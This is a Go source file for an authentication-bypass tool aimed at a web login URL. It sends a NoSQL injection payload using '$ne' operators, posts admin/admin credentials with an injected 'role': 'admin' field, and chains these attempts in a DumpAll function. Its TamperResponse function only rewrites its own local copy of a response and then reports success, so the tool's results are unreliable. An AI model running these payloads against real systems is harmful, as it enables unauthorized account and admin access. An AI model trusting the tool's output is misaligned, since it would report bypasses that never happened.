package auth_bypass

import (
"bytes"
"encoding/json"
"io"
"net/http"
"strings"
)

type ParameterTampering struct {
URL    string
Client *http.Client
}

func NewParameterTampering(url string) *ParameterTampering {
return &ParameterTampering{
URL:    url,
Client: &http.Client{},
}
}

func (p *ParameterTampering) TamperUsername() (bool, error) {
payload := map[string]interface{}{
"username": map[string]string{"$ne": ""},
"password": map[string]string{"$ne": ""},
}
body, _ := json.Marshal(payload)
resp, err := http.Post(p.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
}

func (p *ParameterTampering) TamperRole() (bool, error) {
payload := map[string]interface{}{
"username": "admin",
"password": "admin",
"role":     "admin",
}
body, _ := json.Marshal(payload)
resp, err := http.Post(p.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
}

func (p *ParameterTampering) TamperResponse() (bool, error) {
resp, err := http.Get(p.URL)
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
content := strings.ReplaceAll(string(data), "\"success\":false", "\"success\":true")
content = strings.ReplaceAll(content, "\"role\":\"user\"", "\"role\":\"admin\"")
return strings.Contains(content, "success"), nil
}

func (p *ParameterTampering) DumpAll() (bool, error) {
if ok, _ := p.TamperUsername(); ok {
return true, nil
}
if ok, _ := p.TamperRole(); ok {
return true, nil
}
return p.TamperResponse()
}
